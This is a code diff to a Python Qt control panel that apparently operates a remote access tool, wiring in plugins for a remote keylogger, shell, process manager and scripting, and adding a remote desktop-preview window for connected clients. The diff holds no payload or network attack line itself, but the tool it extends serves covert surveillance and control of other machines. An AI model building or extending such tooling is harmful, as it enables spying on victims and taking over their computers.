@@ -29,6 +29,7 @@ from plugins.mshell import main as mshell
 from plugins.mkeylogger import main as mkeylogger
 from plugins.mprocesses import main as mprocesses
 from plugins.mscript import main as mscript
+from plugins.mdesktop import main as mdesktop
 
 
 # initial geo ip database
@@ -154,6 +155,8 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.actionRemote_Keylogger.triggered.connect(lambda: self.run_plugin('keyloggerMode'))
         self.actionRemote_Scripting.triggered.connect(lambda: self.run_plugin('scriptingMode'))
         self.actionRemote_Process_Manager.triggered.connect(lambda: self.run_plugin('processesMode'))
+        ###
+        self.actionDesktop_Preview.triggered.connect(self.get_desktop_preview)
 
         # menu triggers
         self.actionStartListen_for_connections.triggered.connect(self.listen_start)
@@ -322,18 +325,14 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def get_desktop_preview(self):
         server = self.current_client()
         if server:
-            screen_dict = get(self.socks[server]['sock'], 'getScreen', 'screenshot')
-            try:
-                screen_info = ast.literal_eval(screen_dict)
-                im = Image.frombuffer('RGB', (int(screen_info['width']), int(screen_info['height'])),
-                                      zlib.decompress(screen_info['screenshotbits']), 'raw', 'BGRX', 0, 1)
-                screen_bits = im.convert('RGBA')
-                self.previewLabel.setPixmap(QPixmap.fromImage(ImageQt.ImageQt(screen_bits)).scaled(
-                        self.previewLabel.size(), Qt.KeepAspectRatio))
-                self.current_bits = screen_bits
-                self.screenSaveButton.setDisabled(False)
-            except SyntaxError:
-                pass
+            args = {
+                'sock': self.socks[server]['sock'],
+                'socket': self.socks[server]['socket'],
+                'ipAddress': self.socks[server]['ip_address'],
+                'assets': assets,
+            }
+            self.desktop = mdesktop.mainPopup(args)
+            self.desktop.show()
 
     def get_webcam_preview(self):
         server = self.current_client()
@@ -548,10 +547,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), 'Run As Admin', self.run_as_admin)
             server_menu.addSeparator()
 
-            if self.serversTable.item(server_index, self.index_of_lock).text() == 'LOCKED':
-                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_client)
-
-            else:
+            if self.serversTable.item(server_index, self.index_of_lock).text() == 'UNLOCKED':
                 server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell',
                                       lambda: self.run_plugin('shellMode'))
                 server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
@@ -573,6 +569,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                               self.lock_client)
                 server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
                                               self.terminate_client)
+            else:
+                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Server', self.unlock_client)
+
+            server_menu.addSeparator()
+
+            server_menu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')),
+                                  'Desktop Preview', self.get_desktop_preview)
 
             server_menu.exec_(self.serversTable.mapToGlobal(point))
 
